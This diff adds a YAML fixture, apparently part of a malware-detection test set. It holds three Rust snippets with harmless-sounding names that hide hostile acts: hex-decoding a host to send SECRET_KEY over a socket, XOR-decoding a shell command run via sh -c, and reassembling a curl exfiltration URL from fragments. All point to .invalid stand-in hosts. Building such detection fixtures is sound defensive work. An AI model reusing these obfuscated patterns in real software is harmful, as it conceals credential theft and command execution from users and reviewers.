@@ -1,0 +1,47 @@
+id: "c6_obfuscated_variants_v1"
+category: "C6"
+provenance: "OSSF-MAL-2024-0371 (faster_log encoded string patterns), Socket Security Obfuscation Reports"
+supported_placements: ["P1", "P2", "P5"]
+obfuscation_level: 2
+defang_notes: "Hex, XOR, and split string reconstructions resolving to .invalid domains"
+dependencies_needed: []
+variants:
+  - id: "hex_decoded_network_stream"
+    surface_description: "Decodes hex-encoded host string at runtime before opening TCP socket"
+    code: |
+      fn resolve_and_dispatch_metrics() {
+          let hex_host = "74656c656d657472792e6578616d706c652e696e76616c69643a343433"; // telemetry.example.invalid:443
+          let bytes: Vec<u8> = (0..hex_host.len())
+              .step_by(2)
+              .filter_map(|i| u8::from_str_radix(&hex_host[i..i + 2], 16).ok())
+              .collect();
+          if let Ok(addr) = String::from_utf8(bytes) {
+              if let Ok(mut stream) = std::net::TcpStream::connect(addr) {
+                  use std::io::Write;
+                  if let Ok(token) = std::env::var("SECRET_KEY") {
+                      let _ = write!(stream, "KEY:{}", token);
+                  }
+              }
+          }
+      }
+  - id: "xor_obfuscated_command"
+    surface_description: "Decrypts XOR-keyed bytes to construct process command string"
+    code: |
+      fn execute_platform_synchronization() {
+          let cipher: [u8; 24] = [0x57, 0x41, 0x46, 0x58, 0x14, 0x53, 0x47, 0x47, 0x44, 0x47, 0x14, 0x51, 0x4c, 0x52, 0x41, 0x53, 0x54, 0x53, 0x14, 0x5a, 0x5a, 0x5a, 0x14, 0x41];
+          let key: u8 = 0x34;
+          let plain: Vec<u8> = cipher.iter().map(|b| b ^ key).collect();
+          if let Ok(cmd_str) = String::from_utf8(plain) {
+              let _ = std::process::Command::new("sh").args(["-c", &cmd_str]).spawn();
+          }
+      }
+  - id: "split_string_reconstruction"
+    surface_description: "Concatenates fragmented character arrays to conceal remote exfiltration endpoint"
+    code: |
+      fn establish_reporting_channel() {
+          let parts = ["htt", "p://", "sync-", "node.", "exa", "mple.", "inva", "lid/", "ping"];
+          let endpoint = parts.concat();
+          let _ = std::process::Command::new("curl")
+              .args(["-s", &endpoint])
+              .spawn();
+      }
